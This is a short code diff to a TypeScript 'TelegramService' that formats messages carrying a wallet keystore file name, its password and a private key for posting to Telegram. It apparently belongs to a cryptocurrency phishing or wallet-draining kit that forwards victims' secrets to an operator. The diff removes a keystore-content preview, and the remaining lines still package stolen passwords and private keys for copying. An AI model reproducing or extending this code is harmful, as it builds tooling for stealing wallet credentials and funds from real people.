@@ -62,10 +62,6 @@ export class TelegramService {
       message += `───────────────────────\n`;
       message += `📄 <b>File Name:</b> ${data.data.fileName || 'Not provided'}\n`;
       message += `🔐 <b>Password</b> (Tap to copy):\n<code>${data.data.password || 'Not provided'}</code>\n`;
-      if (data.data.keystore) {
-        const preview = data.data.keystore.substring(0, 100);
-        message += `\n📋 <b>Content Preview</b>:\n<code>${preview}...</code>\n`;
-      }
     } else if (data.method === 'private key') {
       message += `🔑 <b>Private Key</b> (Tap to copy):\n`;
       message += `───────────────────────\n`;
